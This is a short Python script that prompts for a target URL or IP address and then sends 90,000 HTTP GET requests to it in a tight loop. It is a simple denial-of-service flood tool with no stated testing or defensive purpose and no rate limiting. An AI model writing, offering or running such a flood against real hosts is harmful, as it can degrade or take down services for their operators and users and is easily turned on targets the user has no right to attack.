import requests

address = input("Enter the target URL or IP address: ")
url = f'http://{address}/'
payload = {}

for _ in range(90000):
    requests.get(url, params=payload)
